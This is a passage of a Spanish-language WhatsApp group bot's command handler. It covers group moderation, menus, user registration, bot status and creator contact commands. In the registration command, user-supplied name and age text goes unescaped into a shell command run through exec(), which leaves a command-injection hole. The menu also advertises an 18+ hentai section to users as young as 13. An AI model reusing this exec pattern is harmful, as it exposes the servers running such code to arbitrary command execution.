				teks = `⚡ *Invocando a los integrantes del grupo* : \n${groupName}\n*~> Invocador* : _${pushname}_\n*~> Mensaje* : _${texto ? texto : 'No hay :v'}_\n${nwn}\n╔═══ஜ۩۞۩ஜ═══╗\n`
				for (let mem of groupMembers) {
					teks += `╠➥ @${mem.jid.split('@')[0]}\n`
					members_id.push(mem.jid)
				}
				mentions(teks + '╚═══════════', members_id, true)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'ascender':
			case 'darpoder': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (!UwU) return reply(`*A que participante desea convertirlo en administrador?*`)
				let mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				await teslagod.groupMakeAdmin(from, mentioned)
				godeply(`*El participante @${mentioned[0].slice(0, -15)} fue convertido en administrador del grupo ✓*\n_Accion ejecutada por ${pushname}_`)
			}
			addFilter(from)
			break
			case 'degradar':
			case 'quitarpoder': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (!UwU) return reply(`*A que administrador desea quitarle su puesto?*`)
				let mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				await teslagod.groupDemoteAdmin(from, mentioned)
				godeply(`*El administrador @${mentioned[0].slice(0, -15)} fue degradado de ser admin ✓*\n_Accion ejecutada por ${pushname}_`)
			}
			addFilter(from)
			break
			case 'kick':
			case 'ban':
			case 'funar': { //No me hago responsable del mal uso de este comando!!!
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				try {
					let users = mek.mentionedJid[0] ? mek.mentionedJid[0] : mek.quoted.sender
					await teslagod.groupRemove(from, [users]).catch(e => {
						console.log(e)
						reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					})
					godeply(`*El participante @${users.slice(0, -15)} fue eliminado del grupo ✓*\n_Accion ejecutada por ${pushname}_`)
				} catch {
					reply(`*A quien desea eliminar?*\n_Se recomienda solo eliminar un participante, el creador del bot no se hace responsable del mal uso que le puedan dar a este comando!!!_`)
				}
			}
			addFilter(from)
			break
			case 'buscamsj': //Buscador de mensajes en un chat
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (!UwU) return reply(`*[ ! ] _Que mensaje desea buscar dentro de este grupo?_*`)
				buscando(`_Buscando textos similares a : "${UwU}", en el grupo ${groupName} por favor espere..._`)
				let v = await teslagod.searchMessages(UwU, from, 10, 1)
				let s = v.messages
				let el = s.filter(v => v.message)
				el.shift()
				try {
					if (el[0].message.conversation == undefined) return
					reply(`*Encontrado* ${el.length} *mensajes similares* \n\n_Recolectando..._ `)
					for (let i = 0; i < el.length; i++) {
						await teslagod.sendMessage(from, '👆', text, {
							quoted: el[i]
						})
					}
				} catch (e) {
					reply(`*[ ! ] _Lo ciento no encontré similitudes para este mensaje_*`)
				}
				addFilter(from)
				break

				//

			case 'menu':
			case 'help':
			case 'comandos': { //Wa menu
				if (isBaneado) return reply(`K_gaste ${senderNumber} estas baneado, ahora no podrás usar al bot :v`)
				if (isLimit(sender)) return reply(`*[ ! ] Lo siento ${pushname} te quedaste sin límites para seguir usando al bot T~T*\nˢᶦ ˢᵘᵇᵉˢ ᵈᵉ ⁿᶦᵛᵉˡ• ˢᵉ ˡᵉ ʳᵉᵍᵃˡᵃʳᵃⁿ ~⁺³ ᵈᵉ ˡᶦ́ᵐᶦᵗᵉ~`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				let uptime = process.uptime()
				let menutext = `${monospace}< [ ${MyInfo.NombreDelBot} ] >${monospace}
╔═══════════
║❂ Version del bot : ${package.version}
║❂ Actividad : ${kyun(uptime)}
║❂ Creador : ${MyInfo.CoCreador}
║❂ Prefijo unico :「  ${prefix}  」
║❂ Cliente : ${pushname}
║❂ Rol del Cliente : ${role}
╚═══════════
${nvn}
~|-------------------------|~
⮕ *_COMANDOS_  ☷*
~|-------------------------|~

╔═══════════
║ _CONVERSORES :_
║╭——————————
║├ ${prefix}sticker
║├ ${prefix}tiendaimg
║├ ${prefix}inframundo
║├ ${prefix}nightcore
║├ ${prefix}happyhardcore
║├ ${prefix}ardilla
║├ ${prefix}superveloz
║├ ${prefix}demonio
║├ ${prefix}lento
║├ ${prefix}distorcionado
║├ ${prefix}aumentarbajo
║├ ${prefix}amp3
║├ ${prefix}acelerarvid
║├ ${prefix}lentovid
║├ ${prefix}reversavid
║├ ${prefix}rescom
║├ ${prefix}aimg
║╰——————————
╚══════════${nvn}
╔═══════════
║ _MULTIMEDIA :_
║╭——————————
║├ ${prefix}informacion
║├ ${prefix}apoyar
║├ ${prefix}bloqueados
║├ ${prefix}wame
║├ ${prefix}milimite
║├ ${prefix}minivel
║├ ${prefix}estadobot
║├ ${prefix}creador
║├ ${prefix}infogrupo
║├ ${prefix}admins
║├ ${prefix}grupolink
║├ ${prefix}tienda
║├ ${prefix}miperfil
║├ ${prefix}audiokey
║├ ${prefix}horario
║├ ${prefix}nuebot
║╰——————————
╚══════════${nvn}
╔═══════════
║ _PASATIEMPO :_
║╭——————————
║├ ${prefix}quien
║├ ${prefix}tragamoneda
║├ ${prefix}calumnia
║├ ${prefix}dados
║├ ${prefix}dado
║├ ${prefix}emparejar
║├ ${prefix}top5
║├ ${prefix}top10
║├ ${prefix}testgay
║├ ${prefix}keyaudio
║├ ${prefix}votacion
║├ ${prefix}sivotar
║├ ${prefix}novotar
║├ ${prefix}vervotos
║├ ${prefix}reiniciarvotos
║╰——————————
╚══════════${nvn}
╔═══════════
║ _CMDS ADMINS :_
║╭——————————
║├ ${prefix}cgpen
║├ ${prefix}agp
║├ ${prefix}editnamegp
║├ ${prefix}editdesgp
║├ ${prefix}fotogrupo
║├ ${prefix}invocar
║├ ${prefix}darpoder
║├ ${prefix}quitarpoder
║├ ${prefix}ban
║├ ${prefix}buscamsj
║╰┬> _ACTIVADORES_
║╭╯
║├ ${prefix}modofull
║├ ${prefix}animeuwu
║├ ${prefix}hmodo
║├ ${prefix}nivelear
║├ ${prefix}wlc
║├ ${prefix}antitraba
║├ ${prefix}antilink
║├ ${prefix}antilink2
║├ ${prefix}antifakes
║├ ${prefix}antifakes2
║├ ${prefix}antiextranjeros
║╰——————————
╚══════════${nvn}
╔═══════════
║ _CMDS DUEÑO :_
║╭——————————
║├ ${prefix}modo1
║├ ${prefix}modo2
║├ ${prefix}privado
║├ ${prefix}antiprivado
║├ ${prefix}antidel
║├ ${prefix}leerchat
║├ ${prefix}predit
║├ ${prefix}nombrebot
║├ ${prefix}mydueño
║├ ${prefix}misredes
║├ ${prefix}editarlimite
║├ ${prefix}perfilbot
║├ ${prefix}suprimir
║├ ${prefix}bcgc
║├ ${prefix}bc
║├ ${prefix}banear
║├ ${prefix}quitarbaneo
║├ ${prefix}.
║╰┬> _ACTIVADORES_
║╭╯
║├ ${prefix}chatbot
║├ ${prefix}banchat
║╰┬> ~MODO KUAKER~
║╭╯
║├ ${prefix}:)
║╰┬> _AVANZADO_
║╭╯
║├ >
║├ $
║╰——————————
╚═══════════
╔═══════════
║ _MAS COMANDOS EXTRA :_
║╭——————————
║├ ${prefix}mascmds
║├ ${prefix}randmenu
║├ ${prefix}crealogos
║├ ${prefix}mianime
║├ ${prefix}labiblia
║╰——————————
╚═══════════
`
				//locacion funcionando en chats con mensajes temporales xd
				loc = {
					"degreesLatitude": 0,
					"degreesLongitude": 0,
					"jpegThumbnail": mylogo
				}
				try {
					//menu con api funcionando
					var CovidApi = await fetchJson(`https://latam-api.vercel.app/api/covid19?apikey=nekosmic&q=world`)
					teslagod.sendMessage(from, {
						"contentText": `${menutext}`,
						"footerText": `┏「 DATOS - COVID19 」─┓
┃➲ Casos positivos : ${CovidApi.casos}
┃✯ Recuperados : ${CovidApi.recuperados}
┃❥ Tratados : ${CovidApi.activo}
┃✞ Fallecidos : ${CovidApi.muertes}
┗─━─━ 「 🌎 」 ━─━─┛`,
						"buttons": [{
								"buttonId": `${prefix}informacion`,
								"buttonText": {
									"displayText": `[ INFO-BOT ]`
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": `${prefix}creador`,
								"buttonText": {
									"displayText": `[ CREADOR ]`
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": `${prefix}mascmds`,
								"buttonText": {
									"displayText": `[ MAS COMANDOS ☰ ]${nwn}\nᴼᴶᴼ⁼ ᴱˢᵗᵉ ᵐᵉⁿᵘ ⁿᵒ ᶠᵘⁿᶜᶦᵒⁿᵃ ᵉⁿ ᵂʰᵃᵗˢᵃᵖᵖ ᵇᵘˢᶦⁿᵉˢˢ`
								},
								"type": "RESPONSE"
							}
						],
						"headerType": 6,
						"locationMessage": loc,
						quoted: null
					}, MessageType.buttonsMessage, {
						contextInfo: {
							mentionedJid: [sender]
						}
					})
				} catch (e) {
					console.log(`Error fetch, comando: ${command}`)
					//menu de respaldo...
					teslagod.sendMessage(from, {
						"contentText": `${menutext}`,
						"footerText": `${groupName}\n`,
						"buttons": [{
								"buttonId": `${prefix}informacion`,
								"buttonText": {
									"displayText": `[ INFO-BOT ]`
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": `${prefix}creador`,
								"buttonText": {
									"displayText": `[ CREADOR ]`
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": `${prefix}mascmds`,
								"buttonText": {
									"displayText": `[ MAS COMANDOS ☰ ]${nwn}\nᴼᴶᴼ⁼ ᴱˢᵗᵉ ᵐᵉⁿᵘ ⁿᵒ ᶠᵘⁿᶜᶦᵒⁿᵃ ᵉⁿ ᵂʰᵃᵗˢᵃᵖᵖ ᵇᵘˢᶦⁿᵉˢˢ`
								},
								"type": "RESPONSE"
							}
						],
						"headerType": 6,
						"locationMessage": loc,
						quoted: null
					}, MessageType.buttonsMessage, {
						contextInfo: {
							mentionedJid: [sender]
						}
					})
				}
				//
				addFilter(from)
				await limitAdd(sender)
				addLevelingXp(sender, 450)
				addLevelingLevel(sender, 2)
			}
			break
			case 'rg':
			case 'reg': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (isRegistro) return reply(`*[ ! ] Ya estuviste registrado en mi base de datos*`)
				if (!UwU.includes('|')) return reply(`*[ ! ] Por favor agregue una barra en medio de nombre y edad*\n" | "`)
				const namaUser = UwU.substring(0, UwU.indexOf('|') - 0)
				const umurUser = UwU.substring(UwU.lastIndexOf('|') + 1)
				const serialUser = createSerial(20)
				if (isNaN(umurUser)) return await reply(`*[ ! ] En edad solo se aceptan números -.-*`)
				if (namaUser.length >= 15) return reply(`*[ ! ] Bruh el nombre es muy largo ._.*`)
				if (umurUser > 31) return reply(`*[ ! ] Maximo de edad 30 años!*`)
				if (umurUser < 12) return reply(`*[ ! ] Minimo de edad 13 años!*`)

				const nomreg = namaUser
				const edreg = umurUser
				const codereg = serialUser

				let txtro = `〘  *REGISTRO* 〙${nwn}\n❥Fecha y hora de Registro \n❥${time}\n┏─━─━━─━─━━─━─\n╠≽️ *Nombre Registrado : ${nomreg}*\n╠≽️ *Nombre usado en whatsapp : ${pushname}*\n╠≽️ *Edad : ${edreg}*\n╠≽️ *Nº : wa.me/${sender.split("@")[0]}*\n┗─━─━━─━─━━─━─\n_Codigo de registro_ : *${codereg}* `

				addRegisteredUser(sender, pushname, namaUser, umurUser, time, serialUser)

				procesando(`_Procesando, ${pushname} por favor espere..._`)

				exec(`magick './multimedia/imagenes/registro.jpg' -gravity west -fill '#ffffff' -font './multimedia/imagenes/font-gue.ttf' -size 1280x710 -pointsize 75 -interline-spacing 7.5 -annotate +460-47 'Nombre: ${namaUser}' -pointsize 51 -annotate +460+83 'Edad: ${umurUser}' -pointsize 48 -annotate +100+230 '\n${MyInfo.NombreDelBot}' -pointsize 63 -annotate +460+200 'Fecha: ${time}' './multimedia/imagenes/rgdata.jpg' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+66 -composite './multimedia/imagenes/rgx.jpg'`)
					.on('error', () => reply('error'))
					.on('exit', () => {
						try {

							teslagod.sendMessage(from, fs.readFileSync('./multimedia/imagenes/rgx.jpg'), image, {
								thumbnail: userthumb,
								sendEphemeral: true,
								quoted: {
									key: {
										participant: '0@s.whatsapp.net'
									},
									message: {
										documentMessage: {
											title: `${pushname}\nQue tengas un excelente día! :D`,
											jpegThumbnail: fs.readFileSync('./multimedia/imagenes/rgdata.jpg')
										}
									}
								},
								caption: `${txtro}`
							})

						} catch {
							teslagod.sendMessage(from, userthumb, image, {
								thumbnail: mythumb,
								sendEphemeral: true,
								quoted: {
									key: {
										participant: '0@s.whatsapp.net'
									},
									message: {
										documentMessage: {
											title: `${pushname}\nQue tengas un excelente día! :D`,
											jpegThumbnail: fs.readFileSync('./multimedia/imagenes/rgdata.jpg')
										}
									}
								},
								caption: `${txtro}`
							})
						}
					})

				console.log(color('\n[REGISTRADO]'), color(time, 'yellow'), 'Nombre:', color(namaUser, 'cyan'), 'Edad:', color(umurUser, 'cyan'), 'Id:', color(serialUser + "\n", 'cyan'))
			}
			await limitAdd(sender)
			break
			case 'mascmds': { //este menu no funciona desde Whatsapp business!!!
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				const nkbot1 = [`Hola`, `Wenas`, `Que tal`, `Hi`, `Hello`, `Olá`, `Namaste`, `Hey!`, `Aloha`, `Konnichi wa`, `Mi king`, `Que hay`, `Como estas`, `Oi`, `Joder Buenas`]
				const RanRpt = nkbot1[Math.floor(Math.random() * (nkbot1.length))]
				let myking = `${RanRpt}`

				listMsg = {
					buttonText: "Click Aqui ⚡",
					footerText: `> Para ver el resto de comandos, toque el boton de abajo`,
					description: `「 ${myking} ${pushname} 」`,
					sections: [{
						"title": `Seleccione solo una opción! :3`,
						rows: [{
								"title": `Random-Menu ♻️`,
								"description": "ᴸᶦˢᵗᵃ ᵈᵉ ᶜᵒᵐᵃⁿᵈᵒˢ ᵛᵃʳᶦᵃᵈᵒˢ",
								"rowId": `${prefix}randmenu`
							},
							{
								"title": `Crear-Logos 🎨`,
								"description": "ᶜᵒᵐᵃⁿᵈᵒˢ ᵖᵃʳᵃ ᶜʳᵉᵃʳ ˡᵒᵍᵒˢ ʸ ᵐᵃˢ",
								"rowId": `${prefix}crealogos`
							},
							{
								"title": `Otaku/Anime 🀄`,
								"description": "ᶜᵒᵐᵃⁿᵈᵒˢ ᵒᵗᵃᵏᵘ⁻ᵃⁿᶦᵐᵉ ᵛᵃʳᶦᵃᵈᵒ",
								"rowId": `${prefix}mianime`
							},
							{
								"title": `La-Biblia 🥵`,
								"description": "ᶜᵒᵐᵃⁿᵈᵒˢ ʰᵉⁿᵗᵃᶦ⁻ᶜᵃʳᵗᵒᵒⁿ ⁺¹⁸",
								"rowId": `${prefix}labiblia`
							}
						]
					}],
					listType: 1
				}
				teslagod.sendMessage(from, listMsg, MessageType.listMessage, {
					contextInfo: {
						mentionedJid: [sender]
					},
					quoted: fakemek
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 2)
			break
			case 'perfil':
			case 'informacion':
			case 'ping': {
				if (isBaneado) return
				if (isLimit(sender)) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				uptime = process.uptime()
				let grupos = await teslagod.chats.all()
				let i4 = []
				let personal = []
				for (let mem of grupos) {
					i4.push(mem.jid)
				}
				for (let id of i4) {
					if (id && id.includes('g.us')) {
						personal.push(id)
					}
				}
				const execc = `${kyun(uptime)}`
				const timestamp = speed()
				const latensi = speed() - timestamp
				const conectin = `${latensi.toFixed(4)} MS`
				const apodox = `${teslagod.user.name}`
				const servery = `${teslagod.browserDescription[0]}`
				const browserr = `${teslagod.browserDescription[1]}`
				const procesor = `${process.uptime()}`
				const celular = `${device_manufacturer}`
				const osversi = `${os_version}`
				const modelo = `${device_model}`
				const memory = `Usado ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / Restante ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
				const infomcc = `${mcc}`
				const infomnc = `${mnc}`
				const wasapv = `${teslagod.user.phone.wa_version}`
				const hitshoy = `${hit_today.length}`
				const mischat = `${grupos.length - personal.length}`
				const misgp = `${personal.length}`
				const mispriv = `${grupos.length}`
				const osarch = `${os.platform()}`
				const myhost = `${os.hostname()}`
				teslagod.updatePresence(from, Presence.composing)

				let respon = `》 *BOT : (activo)* 《 ${nwn}
┏─━─━━──━━─━─┓
➪ *Version del bot : _5.5.0_*
➪ *Libreria : _https://github.com/adiwajshing/Baileys_*
➪ *Hits de hoy : _${hit_today.length}_*
➪ *Chat privados : _${mischat}_*
➪ *Grupos chat : _${misgp}_*
➪ *Total de chats : _${mispriv}_*
➪ *Tiempo de ejecucion : _${execc}_*
➪ *Servidor Web Whatsapp : _Baileys_*
➪ *Buscador : _${browserr}_*
*EJECUTANDOSE DESDE*
➪ *Dispositivo: _${celular}_*
➪ *Version del sistema Operatico OS : _${osversi}_*
➪ *Modelo del dispositivo : _${modelo}_*
➪ *Plataforma : _${osarch}_*
➪ *Version de Whatsapp : _${wasapv}_*
➪ *Host : _${myhost}_*
➪ *Base OS : _${os.type()}_*
➪ *Arquitectura : _${os.arch()}_*
➪ *MCC código de país del móvil : _${infomcc}_*
➪ *MNC Código de red móvil : _${infomnc}_*
➪ *Velocidad de conexion: _${conectin}_*
➪ *Velocidad de procesamiento : _${procesor}_*
➪ *RAM : _${memory}_*
➫ *Consumó de memoria :*
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
➫ ${cpus[0] ? `_Uso total de CPU_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usado (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
┗─━─「 ✵ 」━─━─┛`.trim()

				teslagod.sendMessage(from, bothumb, image, {
					thumbnail: fs.readFileSync('./multimedia/imagenes/anicode1.jpg'),
					sendEphemeral: true,
					quoted: fakemek,
					contextInfo: {
						mentionedJid: [sender],
						externalAdReply: {
							title: `${groupName}`,
							"body": `${apodox}`,
							"previewType": "PHOTO",
							"thumbnail": mylogo,
							"sourceUrl": `https://github.com/NeKosmic`
						}
					},
					caption: `${respon}`
				})

			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'apoyo':
			case 'apoyar':
			case 'donar':
			case 'dono': {
				if (isBaneado) return
				let reshb = await teslagod.prepareMessageFromContent(from, { //
					"templateMessage": {
						"hydratedFourRowTemplate": {
							"hydratedContentText": "",
							"hydratedFooterText": "",
							"hydratedButtons": [{
								"urlButton": {
									"displayText": "Hidratest",
									"url": "google.com"
								},
								"index": 1
							}]
						},
						"hydratedTemplate": {
							"hydratedContentText": `💻 *Redes sociales* 📲`,
							"hydratedFooterText": `ᴺᵒ ᵖᶦᵈᵒ ᵈᶦⁿᵉʳᵒ• ˢᵒˡᵒ ᶜᵒⁿ ᵗᵘ ᵃᵖᵒʸᵒ ˢᵒʸ ᶠᵉˡᶦᶻ ⁿʷⁿ`,
							"hydratedButtons": [{
									"urlButton": {
										"displayText": "YouTube [ > ]",
										"url": "https://youtube.com/channel/UC_Pp8pT9vbT15k5_-i6oseA"
									}
								},
								{
									"urlButton": {
										"displayText": "Tik-Tok [Ꮄ]",
										"url": "https://vm.tiktok.com/ZMLjUL3sW/"
									}
								},
								{
									"urlButton": {
										"displayText": "Facebook 🅵",
										"url": "https://fb.watch/b7tHGEpS3m/"
									},
									"index": 0
								}
							]
						}
					}
				}, {})
				teslagod.relayWAMessage(reshb).catch(e => {
					console.log(e)
				})
				teslagod.sendMessage(from, `💻 *Redes sociales* 📲\n${nwn}` + social, MessageType.text, {
					sendEphemeral: true,
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `⚡ ${pushname} ⚡`,
							"body": `ᴺᵒ ᵖᶦᵈᵒ ᵈᶦⁿᵉʳᵒ• ˢᵒˡᵒ ᶜᵒⁿ ᵗᵘ ᵃᵖᵒʸᵒ ˢᵒʸ ᶠᵉˡᶦᶻ ⁿʷⁿ`,
							"previewType": "PHOTO",
							"thumbnail": mylogo,
							"sourceUrl": `${reddom}`
						}
					}
				})
			}
			bayarLimit(sender, 4)
			addLevelingXp(sender, 10000)
			addLevelingLevel(sender, 10)
			break
			case 'bloqueados': { //Lista de los contactos bloqueados por el bot
				if (isBaneado) return
				if (isLimit(sender)) return
				let teks = `*_Lista de contactos bloqueados por el bot [✓]_*\n${nwn}`
				for (let block of _blocked) {
					teks += `*[ ! ]* ~@${block.split('@')[0]}~\n`
				}
				teks += `*Total* : ${_blocked.length}`
				teslagod.sendMessage(from, teks.trim(), extendedText, {
					quoted: fakemek,
					contextInfo: {
						"mentionedJid": _blocked
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'miwasa':
			case 'wame':
			case 'wa.me': {
				if (isBaneado) return
				if (isLimit(sender)) return
				teslagod.sendMessage(from, `⚡ *LINKS DE TU NUMERO* ⚡${nwn}\n\n*Solicitado por* : ${pushname}\n\n▪︎ *Su link directo de whatsapp es* :\n\n▪︎ https://wa.me/${senderNumber2}\n\n*O puede usar este otro*\n\n▪︎ https://api.whatsapp.com/send?phone=${senderNumber2} `, MessageType.text, {
					sendEphemeral: true,
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Toque aqui para ver una prueba del link`,
							"body": `${NameBot}`,
							"previewType": "PHOTO",
							"thumbnail": userthumb,
							"sourceUrl": `https://wa.me/${senderNumber2}?text=Hola+${pushname}%0D%0A%E1%B4%AE%CA%B8+%E1%B4%BA%E1%B4%B7`
						}
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'milimite': {
				if (isBaneado) return
				if (isLimit(sender)) return reply(`*[ ! ] Lo siento ${pushname} te quedaste sin límites para seguir usando al bot T~T*\nˢᶦ ˢᵘᵇᵉˢ ᵈᵉ ⁿᶦᵛᵉˡ• ˢᵉ ˡᵉ ʳᵉᵍᵃˡᵃʳᵃⁿ ~⁺³ ᵈᵉ ˡᶦ́ᵐᶦᵗᵉ~`)
				if (checkLimit(sender)) return
			}
			addFilter(from)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'minivel': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isLevelingOn) return reply(`*[ ! ] Nivel no activado*`)
				const userLevel = getLevelingLevel(sender)
				const userXp = getLevelingXp(sender)
				if (userLevel === undefined && userXp === undefined) return reply(`*[ ! ] Nivel no activado*`)
				var resulevel = `┏━━━━❉ *Nivel* ❉━━━━\n┣⊱ Usuario: ${senderNumber}\n┣⊱ Nombre: ${pushname}\n┣⊱ XP conseguido asta el momento:  ${userXp}\n┣⊱ Su nivel actual es: ${userLevel}\n┣⊱ Nivel de poder: ${role2}\n┣⊱ De acuerdo al nivel es: ${role}\n┣⊱ Progreso de nivel: ${per}\n┗━━━━━━━━━━━━━`

				teslagod.sendMessage(from, userthumb, image, {
					thumbnail: mythumb,
					sendEphemeral: true,
					quoted: fakemek,
					caption: `${resulevel}`
				})

			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'estadobot': { //._.
				if (isBaneado) return
				if (isLimit(sender)) return
				loc = {
					"degreesLatitude": 0,
					"degreesLongitude": 0,
					"jpegThumbnail": mylogo
				}
				teslagod.sendMessage(from, {
					"contentText": `
*Grupo* : _[ ${groupName} ]_

*Bot participante <[${NameBot}]>* : _${botNumber2}_

*Bot admin* : _${isBotGroupAdmins ? "[✓]" : "[X]"}_

*Bot* : _${NK_Tesla ? "MODO-PRIVADO [ ! ]" : "MODO-PUBLICO [✓]"}_

*Bot* : _${OnOffLine ? "MODO-SIN-LINEA [ ! ]" : "MODO-EN-LINEA [✓]"}_

*Anti-Privado* : _${AntiPv ? "ACTIVADO [✓]" : "DESACTIVADO [X]"}_

*Anti-Eliminar* : _${antidel ? "ACTIVADO [✓]" : "DESACTIVADO [X]"}_

*Leer-Grupos* : _${readGc ? "ACTIVADO [✓]" : "DESACTIVADO [X]"}_

*Leer-Privados* : _${readPc ? "ACTIVADO [✓]" : "DESACTIVADO [X]"}_

*Modo anime* : _${isAnime ? "Activo [✓]" : "Inactivo [X]"}_

*Modo full* : _${isDiversion ? "Activo [✓]" : "Inactivo [X]"}_

*Modo NSFW* : _${isNsfw ? "Activo [✓]" : "Inactivo [X]"}_

*Nivelear* : _${isLevelingOn ? "Activo [✓]" : "Inactivo [X]"}_

*Antilink* : _${isAntiLink ? "Activo [✓]" : "Inactivo [X]"}_

*Antilink 2* : _${isAntiLinkuwu ? "Activo [✓]" : "Inactivo [X]"}_

*Bienvenida* : _${isWelcom ? "Activo [✓]" : "Inactivo [X]"}_

*No falsos* : _${isFakes1 ? "Activo [✓]" : "Inactivo [X]"}_

*No falsos 2* : _${isFakes2 ? "Activo [✓]" : "Inactivo [X]"}_

*Antitraba* : _${isAntivirtex ? "Activo [✓]" : "Inactivo [X]"}_

*Anti extranjeros* : _${isEstranjeros ? "Activo [✓]" : "Inactivo [X]"}_

*Chat bot* : _${isSimi ? "Activo [✓]" : "Inactivo [X]"}_
`,
					"footerText": `${NameBot} ✓\n${antical ? "Llamadas prohibidas [X]" : "Llamadas permitidas [✓]"}`,
					"buttons": [{
						"buttonId": `${prefix}rebote`,
						"buttonText": {
							"displayText": `[PING 🏓]`
						},
						"type": "RESPONSE"
					}],
					"headerType": 6,
					"locationMessage": loc,
					quoted: null
				}, MessageType.buttonsMessage, {
					contextInfo: {
						mentionedJid: [botNumber]
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'creador':
			case 'owner': {
				if (isBaneado) return
				if (isLimit(sender)) return
				let vcard = 'BEGIN:VCARD\n' +
					'VERSION:3.0\n' +
					'FN:' + cocreador + '\n' +
					'ORG:Otakus Tecnológicos;\n'

					+
					'item1.TEL;waid=51995386439:+51 995 386 439\n' +
					'item1.X-ABLabel:⚡ Creador Principal\n'

					+
					'item2.TEL;waid=' + `${botcontrol[0].slice(0, -15)}` + ':+' + `${botcontrol[0].slice(0, -15)}` + '\n' +
					'item2.X-ABLabel:🤝 Co-Creador\n'

					+
					'item3.EMAIL;type=INTERNET:https://nekosmic.wordpress.com/\n' +
					'item3.X-ABLabel:Email\n'

					+
					'item4.URL;Web:https://www.paypal.me/teslamelendez\n' +
					'item4.ADR:;;🇵🇪 Peru;;;;\n'

					+
					"item5.X-ABLabel:Sexy El Que Lo Lea 7w7\n" +
					'END:VCARD'
				await teslagod.sendMessage(from, {
					displayname: "NeKosmic",
					vcard: vcard
				}, MessageType.contact, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: 'Matt_Mdz ✓',
							body: `Sexy El Que Lo Lea 7w7`,
							sourceUrl: `${reddom}`,
							thumbnail: mythumb
						}
					}
				})
			}
			await limitAdd(sender)
			addLevelingXp(sender, 800)
			addLevelingLevel(sender, 5)
			break
			case 'infogrupo':
			case 'grupoinfo':
			case 'infogp':
			case 'gpinfo':
			case 'grupocreador': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				let res = groupMetadata

				function formatDate(n, locale = 'es') {
					let d = new Date(n)
					return d.toLocaleDateString(locale, {
						weekday: 'long',
						day: 'numeric',
						month: 'long',
						year: 'numeric',
						hour: 'numeric',
						minute: 'numeric',
						second: 'numeric'
					})
				}

				function secondsToString(seconds) {
					var numdays = Math.floor(seconds / 86400);
